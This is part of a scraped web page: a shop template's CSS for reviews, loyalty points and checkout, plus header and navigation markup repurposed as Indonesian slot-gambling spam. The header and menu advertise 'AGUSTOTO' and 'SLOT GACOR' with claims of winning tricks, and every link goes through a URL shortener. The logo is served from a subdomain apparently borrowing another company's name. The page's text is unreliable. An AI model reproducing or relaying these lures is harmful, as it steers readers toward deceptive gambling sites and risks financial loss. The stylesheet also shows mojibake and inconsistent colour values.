  display: inline-flex;
  align-items: center;
  font-size: 12px;
  color: #6b7280;
  background: #f3f4f6;
  padding: 2px 6px;
  border-radius: 4px;
  margin-left: 4px;
  cursor: help;
}

.review-rating .stars {
  font-size: 16px;
  color: #fbbf24;
}

.review-date {
  font-size: 13px;
  color: #9ca3af;
  margin-bottom: 12px;
}

.review-text {
  font-size: 15px;
  line-height: 1.6;
  color: #374151;
  margin-bottom: 12px;
}

.review-images {
  display: flex;
  gap: 8px;
  margin-bottom: 12px;
  flex-wrap: wrap;
}

.review-img {
  width: 80px;
  height: 80px;
  object-fit: cover;
  border-radius: 8px;
  cursor: pointer;
  transition: transform 0.2s;
}

.review-img:hover {
  transform: scale(1.05);
}

.review-actions {
  display: flex;
  gap: 12px;
  padding-top: 12px;
  border-top: 1px solid #f3f4f6;
}

.btn-helpful {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 6px 12px;
  background: #f9fafb;
  border: 1px solid #e5e7eb;
  border-radius: 6px;
  font-size: 13px;
  color: #6b7280;
  cursor: pointer;
  transition: all 0.2s;
}

.btn-helpful:hover {
  background: #f3f4f6;
  color: #111827;
  border-color: #d1d5db;
}

.btn-helpful.voted {
  background: #dbeafe;
  color: #1d4ed8;
  border-color: #93c5fd;
}

.helpful-icon {
  font-size: 14px;
}

.no-reviews {
  text-align: center;
  padding: 60px 20px;
  color: #9ca3af;
  font-size: 15px;
}

.load-more-btn {
  display: block;
  margin: 24px auto 0;
  padding: 12px 32px;
  background: white;
  border: 1px solid #d1d5db;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 500;
  color: #374151;
  cursor: pointer;
  transition: all 0.2s;
}

.load-more-btn:hover {
  background: #f9fafb;
  border-color: #9ca3af;
}

/* ===================================
   POINT BALANCE WIDGET (LEGACY - kept for backward compatibility)
   =================================== */

.point-balance-card {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  padding: 24px;
  border-radius: 16px;
  margin-bottom: 24px;
  box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
}

.point-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 12px;
}

.point-header h3 {
  font-size: 18px;
  font-weight: 600;
  margin: 0;
  display: flex;
  align-items: center;
  gap: 8px;
}

.point-header .balance {
  font-size: 32px;
  font-weight: 700;
}

.point-value {
  font-size: 14px;
  opacity: 0.9;
  margin: 8px 0 16px;
}

.point-stats {
  display: flex;
  gap: 20px;
  font-size: 13px;
  opacity: 0.85;
  margin-bottom: 16px;
}

.btn-view-history {
  display: inline-block;
  padding: 10px 20px;
  background: rgba(255, 255, 255, 0.2);
  color: white;
  text-decoration: none;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 500;
  transition: background 0.2s;
}

.btn-view-history:hover {
  background: rgba(255, 255, 255, 0.3);
}

/* ===================================
   CHECKOUT POINT REDEMPTION
   =================================== */

.checkout-points {
  padding: 16px;
  background: #fef3c7;
  border: 2px solid #fbbf24;
  border-radius: 12px;
  margin-bottom: 16px;
}

.points-header {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 12px;
}

.points-header input[type="checkbox"] {
  width: 18px;
  height: 18px;
  cursor: pointer;
}

.points-header label {
  font-size: 15px;
  color: #78350f;
  cursor: pointer;
  margin: 0;
}

#points-slider {
  padding: 16px;
  background: white;
  border-radius: 8px;
  margin-top: 12px;
}

#points-slider label {
  display: block;
  font-size: 14px;
  color: #374151;
  margin-bottom: 8px;
  font-weight: 500;
}

#points-amount {
  width: 100%;
  margin-bottom: 8px;
}

#points-display {
  display: flex;
  justify-content: space-between;
  font-size: 14px;
  color: #111827;
  margin-top: 8px;
}

#points-display .discount-amount {
  color: #059669;
  font-weight: 600;
}

.price-row.point-discount {
  color: #059669;
  font-weight: 500;
}

/* ===================================
   REVIEWABLE ORDERS
   =================================== */

.reviewable-orders {
  background: white;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 20px;
  margin-bottom: 24px;
}

.reviewable-orders h3 {
  font-size: 18px;
  margin-bottom: 16px;
  color: #111827;
}

.order-card {
  display: flex;
  gap: 16px;
  padding: 16px;
  background: #f9fafb;
  border-radius: 8px;
  margin-bottom: 12px;
}

.order-card:last-child {
  margin-bottom: 0;
}

.order-card img {
  width: 80px;
  height: 80px;
  object-fit: cover;
  border-radius: 8px;
}

.order-info {
  flex: 1;
}

.order-info h4 {
  font-size: 15px;
  margin: 0 0 4px;
  color: #111827;
}

.order-info p {
  font-size: 13px;
  color: #6b7280;
  margin: 0 0 12px;
}

.btn-review {
  padding: 8px 16px;
  background: #059669;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  transition: background 0.2s;
}

.btn-review:hover {
  background: #047857;
}

/* ===================================
   TOAST NOTIFICATIONS
   =================================== */

.review-toast {
  position: fixed;
  bottom: 24px;
  right: 24px;
  padding: 14px 20px;
  background: #111827;
  color: white;
  border-radius: 8px;
  font-size: 14px;
  line-height: 1.4;
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
  transform: translateY(100px);
  opacity: 0;
  transition: all 0.3s ease;
  z-index: 10000;
  max-width: 400px;
  word-wrap: break-word;
}

.review-toast.show {
  transform: translateY(0);
  opacity: 1;
}

/* Mobile: Position above bottom-nav */
@media (max-width: 768px) {
  .review-toast {
    bottom: 80px; /* Above bottom-nav (50px height + padding + safe margin) */
    right: 16px;
    left: 16px;
    max-width: calc(100% - 32px);
  }
}

.review-toast.toast-success {
  background: #059669;
}

.review-toast.toast-error {
  background: #8adeff;
}

.review-toast.toast-info {
  background: #2563eb;
}

/* ===================================
   RESPONSIVE
   =================================== */

@media (max-width: 768px) {
  .point-balance-card {
    border-radius: 0;
  }
  
  .review-stats {
    grid-template-columns: 70px 1fr;
    gap: 20px;
    padding: 16px;
  }

  .rating-summary {
    text-align: center;
  }
  
  .rating-summary .avg-rating {
    font-size: 32px;
  }
  
  .rating-summary .stars {
    font-size: 18px;
    margin: 4px 0;
  }
  
  .total-reviews {
    font-size: 11px;
  }
  
  /* Rating breakdown - more compact */
  .rating-breakdown {
    gap: 2px;
  }
  
  .rating-breakdown .rating-bar {
    gap: 4px;
  }
  
  .rating-breakdown .rating-label {
    font-size: 11px;
    width: 16px;
    min-width: 16px;
    text-align: left;
  }
  
  .rating-breakdown .bar-container {
    height: 6px;
  }
  
  .rating-breakdown .rating-count {
    font-size: 11px;
    width: 16px;
    min-width: 16px;
  }
  
  .review-header {
    flex-direction: column;
    gap: 8px;
    align-items: flex-start;
  }
  
  .review-rating {
    order: -1;
    margin-bottom: 4px;
  }
  
  .review-rating .stars {
    font-size: 14px;
  }

  .review-filters {
    flex-direction: column;
    gap: 12px;
    align-items: stretch;
  }

  .review-sort {
    width: 100%;
  }

  .point-header .balance {
    font-size: 24px;
  }

  .point-stats {
    flex-direction: column;
    gap: 8px;
  }

  .order-card {
    flex-direction: column;
  }

  .order-card img {
    width: 100%;
    height: 200px;
  }
}

/* ===================================
   LOADING & ERROR STATES
   =================================== */

.review-loading {
  text-align: center;
  padding: 40px;
  color: #9ca3af;
  font-size: 14px;
}

.review-error {
  text-align: center;
  padding: 40px;
  color: #8adeff;
  font-size: 14px;
  background: #fee2e2;
  border-radius: 8px;
}

.review-empty {
  text-align: center;
  padding: 10px;
  color: #6b7280;
  font-size: 14px;
}

/* ===================================
   REVIEWABLE ORDERS LIST
   =================================== */

.reviewable-orders-list {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.reviewable-order-item {
  display: grid;
  grid-template-columns: 80px 1fr auto;
  gap: 16px;
  padding: 16px;
  background: #fff;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  align-items: center;
  transition: box-shadow 0.2s;
}

.reviewable-order-item:hover {
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
}

.reviewable-order-item .roi-image {
  width: 80px;
  height: 80px;
  object-fit: cover;
  border-radius: 8px;
  border: 1px solid #e5e7eb;
}

.reviewable-order-item .roi-info {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.reviewable-order-item .roi-info h4 {
  margin: 0;
  font-size: 15px;
  font-weight: 600;
  color: #111827;
  line-height: 1.4;
}

.reviewable-order-item .roi-meta {
  margin: 0;
  font-size: 13px;
  color: #6b7280;
}

.reviewable-order-item .btn-write-review {
  white-space: nowrap;
  padding: 10px 20px;
  font-size: 14px;
}

@media (max-width: 640px) {
  .reviewable-order-item {
    grid-template-columns: 60px 1fr;
    gap: 12px;
  }
  
  .reviewable-order-item .roi-image {
    width: 60px;
    height: 60px;
  }
  
  .reviewable-order-item .btn-write-review {
    grid-column: 1 / -1;
    width: 100%;
  }
}

/* ===================================
   REVIEW SUBMISSION MODAL
   =================================== */

/* Modal Overlay Background */
#review-modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.6) !important;
  backdrop-filter: blur(8px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 99999 !important;
  padding: 20px;
}

.review-modal {
  max-width: 600px !important;
  width: 90% !important;
  background: white;
  border-radius: 16px !important;
  box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
  max-height: 90vh;
  display: flex;
  flex-direction: column;
  overflow: hidden !important;
}

#review-modal-overlay .modal-content,
.review-modal .modal-content {
  padding: 0 !important;
  flex: initial !important;
  overflow-y: visible !important;
}

.review-modal .modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 20px 24px;
  border-bottom: 1px solid #e5e7eb;
}

.review-modal .modal-title {
  margin: 0;
  font-size: 20px;
  font-weight: 700;
  color: #111827;
}

.review-modal .modal-close {
  background: none;
  border: none;
  cursor: pointer;
  padding: 4px;
  color: #6b7280;
  transition: color 0.2s;
  display: flex;
  align-items: center;
  justify-content: center;
}

.review-modal .modal-close:hover {
  color: #111827;
}

.review-modal .modal-body {
  padding: 24px;
  max-height: calc(90vh - 140px);
  overflow-y: auto;
}

/* Custom Scrollbar for Modal */
.review-modal .modal-body::-webkit-scrollbar {
  width: 8px;
}

.review-modal .modal-body::-webkit-scrollbar-track {
  background: #f1f5f9;
  border-radius: 4px;
}

.review-modal .modal-body::-webkit-scrollbar-thumb {
  background: linear-gradient(180deg, #3b82f6 0%, #2563eb 100%);
  border-radius: 4px;
}

.review-modal .modal-body::-webkit-scrollbar-thumb:hover {
  background: linear-gradient(180deg, #2563eb 0%, #1d4ed8 100%);
}

/* Firefox Scrollbar */
.review-modal .modal-body {
  scrollbar-width: thin;
  scrollbar-color: #3b82f6 #f1f5f9;
}

.review-modal .modal-footer {
  display: flex;
  gap: 12px;
  margin-top: 24px;
  padding-top: 20px;
  border-top: 1px solid #f1f5f9;
}

.review-product-info {
  display: flex;
  gap: 16px;
  padding: 16px;
  background: #f9fafb;
  border-radius: 8px;
  margin-bottom: 24px;
}

.review-product-thumb {
  width: 80px;
  height: 80px;
  object-fit: cover;
  border-radius: 6px;
  border: 1px solid #e5e7eb;
}

.review-product-details h4 {
  margin: 0 0 8px 0;
  font-size: 16px;
  font-weight: 600;
  color: #111827;
}

.review-product-details p {
  margin: 0;
  font-size: 13px;
  color: #6b7280;
}

/* Star Rating Input */
.star-rating-input {
  display: inline-flex;
  gap: 8px;
  margin-right: 12px;
  vertical-align: middle;
}

.star-btn {
  background: none;
  border: none;
  font-size: 32px;
  color: #d1d5db;
  cursor: pointer;
  transition: all 0.2s;
  padding: 0;
  line-height: 1;
}

.star-btn:hover,
.star-btn.active {
  color: #fbbf24;
  transform: scale(1.1);
}

.rating-label {
  display: inline-block;
  font-size: 15px;
  color: #6b7280;
  margin: 0;
  vertical-align: middle;
  min-width: 150px;
}

/* Form Elements */
.review-form .form-group {
  margin-bottom: 20px;
}

.review-form .form-label {
  display: block;
  font-size: 14px;
  font-weight: 600;
  color: #374151;
  margin-bottom: 8px;
}

.review-form .form-control {
  width: 100%;
  padding: 12px;
  border: 1px solid #d1d5db;
  border-radius: 8px;
  font-size: 14px;
  font-family: inherit;
  transition: border-color 0.2s;
}

.review-form .form-control:focus {
  outline: none;
  border-color: #2563eb;
  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
}

.review-form .form-hint {
  font-size: 13px;
  color: #6b7280;
  margin-top: 8px;
}

/* Image Upload */
.btn-upload-trigger {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 10px 16px;
  background: #f9fafb;
  border: 2px dashed #d1d5db;
  border-radius: 8px;
  color: #374151;
  cursor: pointer;
  font-size: 14px;
  font-weight: 500;
  transition: all 0.2s;
}

.btn-upload-trigger:hover {
  background: #f3f4f6;
  border-color: #2563eb;
  color: #2563eb;
}

.image-preview-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
  gap: 12px;
  margin-top: 16px;
}

.image-preview-item {
  position: relative;
  aspect-ratio: 1;
  border-radius: 8px;
  overflow: hidden;
  border: 1px solid #e5e7eb;
}

.image-preview-item img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.remove-image {
  position: absolute;
  top: 4px;
  right: 4px;
  background: rgba(0, 0, 0, 0.7);
  border: none;
  color: white;
  width: 24px;
  height: 24px;
  border-radius: 50%;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: background 0.2s;
}

.remove-image:hover {
  background: rgba(0, 0, 0, 0.9);
}

/* Point Reward Info */
.point-reward-info {
  background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
  border: 2px solid #fbbf24;
  border-radius: 12px;
  padding: 16px;
  margin: 20px 0;
}

.pri-header {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 16px;
  font-weight: 700;
  color: #92400e;
  margin-bottom: 12px;
}

.pri-list {
  list-style: none;
  padding: 0;
  margin: 0 0 12px 0;
}

.pri-list li {
  padding: 6px 0;
  font-size: 14px;
  color: #78350f;
  transition: opacity 0.2s;
}

.pri-total {
  padding-top: 12px;
  border-top: 2px solid rgba(251, 191, 36, 0.3);
  font-size: 16px;
  color: #92400e;
  font-weight: 600;
}

.form-error {
  background: #fee2e2;
  border: 1px solid #f87171;
  color: #991b1b;
  padding: 12px;
  border-radius: 8px;
  font-size: 14px;
  margin-top: 16px;
}

/* Buttons */
.review-form .btn {
  padding: 12px 24px;
  border: none;
  border-radius: 8px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
}

.review-form .btn-primary {
  background: #2563eb;
  color: white;
}

.review-form .btn-primary:hover {
  background: #1d4ed8;
}

.review-form .btn-primary:disabled {
  background: #94a3b8;
  cursor: not-allowed;
}

.review-form .btn-secondary {
  background: #f1f5f9;
  color: #64748b;
}

.review-form .btn-secondary:hover {
  background: #e2e8f0;
  color: #475569;
}

@media (max-width: 768px) {
    #review-modal-overlay { padding: 0; }
    .review-modal { max-width: 100%; width: 100% !important; }
}

/* ===================================
   POINT SUMMARY GRID (Profile Page)
   =================================== */

.point-summary-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 12px;
  margin-bottom: 32px;
}

.point-summary-card {
  background: linear-gradient(135deg, #f9fafb 0%, #ffffff 100%);
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  transition: all 0.2s;
}

.point-summary-card:hover {
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
  transform: translateY(-2px);
}

.point-summary-card .psc-left {
  display: flex;
  flex-direction: column;
  gap: 2px;
}

.point-summary-card .psc-icon {
  font-size: 24px;
  margin-bottom: 4px;
}

.point-summary-card .psc-label {
  font-size: 13px;
  color: #6b7280;
  font-weight: 500;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.point-summary-card .psc-value {
  font-size: 26px;
  font-weight: 700;
  color: #111827;
  flex-shrink: 0;
}

/* Point History Section */
.point-history-section {
  margin-top: 32px;
}

.point-history-section h3 {
  font-size: 18px;
  font-weight: 600;
  color: #111827;
  margin-bottom: 16px;
}

.point-history-list {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.point-history-item {
  display: grid;
  grid-template-columns: 40px 1fr auto;
  gap: 16px;
  padding: 16px;
  background: white;
  border: 1px solid #e5e7eb;
  border-radius: 10px;
  align-items: center;
  transition: all 0.2s;
}

.point-history-item:hover {
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
}

.point-history-item.credit {
  border-left: 3px solid #10b981;
}

.point-history-item.debit {
  border-left: 3px solid #f59e0b;
}

.point-history-item .phi-icon {
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  border-radius: 50%;
  background: #f9fafb;
}

.point-history-item.credit .phi-icon {
  background: #d1fae5;
}

.point-history-item.debit .phi-icon {
  background: #fef3c7;
}

.point-history-item .phi-details {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.point-history-item .phi-desc {
  font-size: 15px;
  font-weight: 500;
  color: #111827;
}

.point-history-item .phi-date {
  font-size: 13px;
  color: #9ca3af;
}

.point-history-item .phi-amount {
  font-size: 18px;
  font-weight: 700;
}

.point-history-item .phi-amount.credit {
  color: #10b981;
}

.point-history-item .phi-amount.debit {
  color: #f59e0b;
}

@media (max-width: 640px) {
  .point-summary-grid {
    grid-template-columns: 1fr;
  }
  
  .point-summary-card .psc-value {
    font-size: 22px;
  }

  .point-history-item {
    grid-template-columns: 36px 1fr;
    gap: 12px;
  }
  
  .point-history-item .phi-amount {
    grid-column: 2;
    text-align: right;
    margin-top: 8px;
  }
}

/* â”€â”€ Pending points: compact widget indicator â”€â”€ */
.pbc-pending {
  font-size: 12px;
  opacity: 0.85;
  margin-top: 4px;
  color: #fde68a;
}

/* â”€â”€ Pending points: summary card â”€â”€ */
.point-summary-card.psc-pending-card {
  background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
  border-color: #fcd34d;
}

.point-summary-card.psc-pending-card .psc-value {
  color: #b45309;
}

.point-summary-card .psc-sub {
  font-size: 11px;
  color: #9ca3af;
  margin-top: 4px;
}

/* â”€â”€ Pending points: history item â”€â”€ */
.point-history-item.phi-pending {
  opacity: 0.75;
  border-left-color: #fcd34d;
  background: #fffbeb;
}

.point-history-item.phi-pending .phi-icon {
  background: #fef3c7;
}

.phi-pending-badge {
  display: inline-block;
  font-size: 11px;
  font-weight: 600;
  padding: 2px 7px;
  border-radius: 10px;
  background: #fef3c7;
  color: #92400e;
  border: 1px solid #fcd34d;
  margin-left: 8px;
  vertical-align: middle;
}

/* â”€â”€ Reversed points: history item â”€â”€ */
.point-history-item.phi-reversed {
  opacity: 0.55;
  border-left-color: #d1d5db;
  background: #f9fafb;
}

.point-history-item.phi-reversed .phi-icon {
  background: #f3f4f6;
}

.point-history-item.phi-reversed .phi-amount {
  text-decoration: line-through;
  color: #9ca3af !important;
}

.phi-reversed-badge {
  display: inline-block;
  font-size: 11px;
  font-weight: 600;
  padding: 2px 7px;
  border-radius: 10px;
  background: #8adeff;
  color: #8adeff;
  border: 1px solid #8adeff;
  margin-left: 8px;
  vertical-align: middle;
}

</style>
            
</head>
<body>
<header class="topbar">
  <div class="container topbar-inner">
    <div class="topbar-left">
      AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat
    </div>
    <div class="topbar-right">
      <a href="https://shortt.ink/anakbinjai">AGUSTOTO</a>
      <a href="https://shortt.ink/anakbinjai">AGUSTOTO</a>
      <a href="https://shortt.ink/anakbinjai">SLOT GACOR</a>
      <a href="https://shortt.ink/anakbinjai">Slot WD</a>
    </div>
  </div>
</header>
<nav class="navbar">
  <nav class="navbar-logo" style="width: 100%;">
    <div class="container nav-inner" style="justify-items: center; justify-content: center;">
        <a href="https://shortt.ink/anakbinjai" class="logo-mobile" title="AGUSTOTO">
          <img src="https://chemtrols-com.agustoto.xyz/asset/logo-brand-4ccb5659c5aa5aef.png" alt="AGUSTOTO" height="40">
        </a>
    </div>
</nav>
  <div class="container nav-inner">
    <a href="https://shortt.ink/anakbinjai" class="logo" title="AGUSTOTO">
      <img src="https://chemtrols-com.agustoto.xyz/asset/logo-brand-4ccb5659c5aa5aef.png" alt="AGUSTOTO" height="40">
    </a>

    
    <form class="search" method="get" action="#">
      <input type="hidden" name="page" value="produk">
      
      <!-- Search Icon (Desktop) -->
      <button type="submit" class="search-icon-btn" id="searchBtn" aria-label="Cari">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="11" cy="11" r="8"/>
          <path d="m21 21-4.35-4.35"/>
        </svg>
      </button>
      
      <input type="text" name="q" id="searchInput" placeholder="AGUSTOTO DEPO 5K?"
             value="" autocomplete="off"> 
      
      <div class="search-suggest" id="searchSuggest" hidden></div>
    </form>

    <div class="nav-actions">
      <!--<button class="icon-btn" id="notifBtn" title="Notifikasi">ðŸ””</button>-->
      <button class="icon-btn cart-indicator" id="cartBtn" title="Keranjang">
        ðŸ›’ <span id="cartCount" class="badge" data-role="cart-badge" aria-live="polite">0</span>
      </button>

      <button class="icon-btn compare-indicator" id="compareBtn" title="Perbandingan">
        âš–ï¸ <span id="compareCount" class="badge" data-role="compare-badge" aria-live="polite">0</span>
      </button>
      
      <!-- Dynamic login/logout button -->
            <button class="login-btn" id="loginBtn" aria-label="Masuk">
        <span class="login-text">Masuk</span>
        <span class="login-ico" aria-hidden="true">ðŸ˜Š</span>
      </button>
          </div>
  </div>

  <div class="container" style="display: flex; align-items: center;">
      

      <div class="mega-cats-wrapper">
        <div class="mega-cats container" id="megaCatsScroll" style="padding-left: 5px !important;">
                      <a class="" href="https://shortt.ink/anakbinjai">
              AGUSTOTO           </a>
                      <a class="" href="https://shortt.ink/anakbinjai">
              AGUSTOTO            </a>
                      <a class="" href="https://shortt.ink/anakbinjai">
              LOGIN AGUSTOTO            </a>
                      <a class="" href="https://shortt.ink/anakbinjai">
              DAFTAR AGUSTOTO           </a>
                      <a class="" href="https://shortt.ink/anakbinjai">
              SLOT GACOR            </a>
                      <a class="" href="https://shortt.ink/anakbinjai">
              Slot WD            </a>
                  </div>
        <div class="mega-cats-fade" id="megaCatsFade"></div>
      </div>
  </div>
</nav>

<!-- Panel Mega Menu - Outside navbar for full-screen -->
<div class="mm2-panel" data-mm2="panel" role="dialog" aria-label="Kategori">
  <div class="mm2-view is-active" data-mm2="top"></div>
  <div class="mm2-view" data-mm2="detail"></div>
</div>

<!-- Backdrop - Outside navbar for full-screen -->
<div class="mm2-backdrop" data-mm2="backdrop"></div>

<!-- Mobile Bottom Navigation -->
<nav class="bottom-nav">
  <div class="bottom-nav-inner">
    <!-- Home -->
    <a href="/" class="bottom-nav-item" id="bottomHomeBtn" data-page="home">
      <div class="bottom-nav-item-icon">
        <!-- Outlined icon (default) -->
        <svg class="icon-outlined" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
          <polyline points="9 22 9 12 15 12 15 22"/>
        </svg>
        <!-- Filled icon (active) -->
        <svg class="icon-filled" viewBox="0 0 24 24" fill="currentColor">
          <path d="M11.47 3.84a.75.75 0 011.06 0l8.69 8.69a.75.75 0 010 1.06l-.03.03a.75.75 0 01-1.06 0l-8.16-8.16-8.16 8.16a.75.75 0 01-1.06 0l-.03-.03a.75.75 0 010-1.06l8.69-8.69z"/>
          <path d="M12 5.5l-7.5 7.5v8.25c0 .414.336.75.75.75h3.75v-6h6v6h3.75a.75.75 0 00.75-.75V13l-7.5-7.5z"/>
        </svg>
      </div>
      <span class="bottom-nav-item-label">Home</span>
    </a>

    <!-- Kategori -->
    <button class="bottom-nav-item" id="bottomCategoryBtn" data-mm2="trigger" aria-label="Kategori">
      <div class="bottom-nav-item-icon">
        <!-- Outlined icon (default) -->
        <svg class="icon-outlined" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="3" y1="12" x2="21" y2="12"/>
          <line x1="3" y1="6" x2="21" y2="6"/>
          <line x1="3" y1="18" x2="21" y2="18"/>
        </svg>
        <!-- Filled icon (active) -->
        <svg class="icon-filled" viewBox="0 0 24 24" fill="currentColor">
          <path d="M3 5.25A.75.75 0 013.75 4.5h16.5a.75.75 0 010 1.5H3.75A.75.75 0 013 5.25zM3 12a.75.75 0 01.75-.75h16.5a.75.75 0 010 1.5H3.75A.75.75 0 013 12zm0 6.75a.75.75 0 01.75-.75h16.5a.75.75 0 010 1.5H3.75a.75.75 0 01-.75-.75z"/>
        </svg>
      </div>
      <span class="bottom-nav-item-label">Kategori</span>
    </button>

    <!-- Keranjang -->
    <button class="bottom-nav-item" id="bottomCartBtn">
      <div class="bottom-nav-item-icon">
        <!-- Outlined icon (default) -->
        <svg class="icon-outlined" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="9" cy="21" r="1"/>
          <circle cx="20" cy="21" r="1"/>
          <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
        </svg>
        <!-- Filled icon (active) -->
        <svg class="icon-filled" viewBox="0 0 24 24" fill="currentColor">
          <path d="M2.25 2.25a.75.75 0 000 1.5h1.386c.17 0 .318.114.362.278l2.558 9.592a3.752 3.752 0 00-2.806 3.63c0 .414.336.75.75.75h15.75a.75.75 0 000-1.5H5.378A2.25 2.25 0 017.5 15h11.218a.75.75 0 00.674-.421 60.358 60.358 0 002.96-7.228.75.75 0 00-.525-.965A60.864 60.864 0 005.68 4.509l-.232-.867A1.875 1.875 0 003.636 2.25H2.25zM3.75 20.25a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0zM16.5 20.25a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"/>
        </svg>
        <span class="bottom-nav-item-badge" id="bottomCartCount">0</span>
      </div>
      <span class="bottom-nav-item-label">Keranjang</span>
    </button>

    <!-- Compare -->
    <button class="bottom-nav-item" id="bottomCompareBtn">
      <div class="bottom-nav-item-icon">
        <!-- Outlined icon (default) -->
        <svg class="icon-outlined" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="17 11 21 7 17 3"/>
          <path d="M21 7H9"/>
          <polyline points="7 21 3 17 7 13"/>
          <path d="M15 17H3"/>
        </svg>
        <!-- Filled icon (active) -->
        <svg class="icon-filled" viewBox="0 0 24 24" fill="currentColor">
          <path d="M21.75 6.75a.75.75 0 00-.75-.75H9a.75.75 0 000 1.5h10.19L15.22 11.47a.75.75 0 001.06 1.06l4.5-4.5a.75.75 0 00.22-.53.75.75 0 00-.22-.53l-.03-.03zM8.78 12.47L4.28 16.97a.75.75 0 000 1.06l4.5 4.5a.75.75 0 001.06-1.06L6.06 18H15a.75.75 0 000-1.5H4.81l3.97-3.97a.75.75 0 00-1.06-1.06z"/>
        </svg>
        <span class="bottom-nav-item-badge" id="bottomCompareCount" style="display:none;">0</span>
      </div>
      <span class="bottom-nav-item-label">Compare</span>
    </button>

    <!-- Chat - Always show, check login in JavaScript -->
    <button class="bottom-nav-item" id="bottomChatBtn" data-page="chat">
      <div class="bottom-nav-item-icon">
        <!-- Outlined icon (default) -->
        <svg class="icon-outlined" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" opacity="0.85">
          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
        </svg>
        <!-- Filled icon (active) -->
        <svg class="icon-filled" viewBox="0 0 24 24" fill="currentColor">
          <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/>
        </svg>
        <span class="bottom-nav-item-badge" id="bottomChatCount" style="display:none;">0</span>
      </div>
      <span class="bottom-nav-item-label">Chat</span>
    </button>

    <!-- Akun -->
        <button class="bottom-nav-item" id="bottomLoginBtn">
      <div class="bottom-nav-item-icon">
        <!-- Outlined icon (default) -->
        <svg class="icon-outlined" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
        <!-- Filled icon (active) -->
        <svg class="icon-filled" viewBox="0 0 24 24" fill="currentColor">
          <path fill-rule="evenodd" d="M7.5 6a4.5 4.5 0 119 0 4.5 4.5 0 01-9 0zM3.751 20.105a8.25 8.25 0 0116.498 0 .75.75 0 01-.437.695A18.683 18.683 0 0112 22.5c-2.786 0-5.433-.608-7.812-1.7a.75.75 0 01-.437-.695z" clip-rule="evenodd"/>
        </svg>
      </div>
      <span class="bottom-nav-item-label">Login</span>
    </button>
      </div>
</nav>

<!-- Mobile User Menu Bottom Sheet -->

<script nonce="se3iyzEHMc9FQEB4wSyd0w==">
(function(){
  const btn = document.getElementById('megaMoreBtn');
  const dd  = document.getElementById('megaMoreDropdown');
  if(!btn || !dd) return;

  function openDD(){
    dd.hidden = false;
    btn.setAttribute('aria-expanded','true');
    document.addEventListener('click', outside, {capture:true});
    document.addEventListener('keydown', esc);
  }
  function closeDD(){
    if(dd.hidden) return;
    dd.hidden = true;
    btn.setAttribute('aria-expanded','false');
    document.removeEventListener('click', outside, {capture:true});
    document.removeEventListener('keydown', esc);
  }
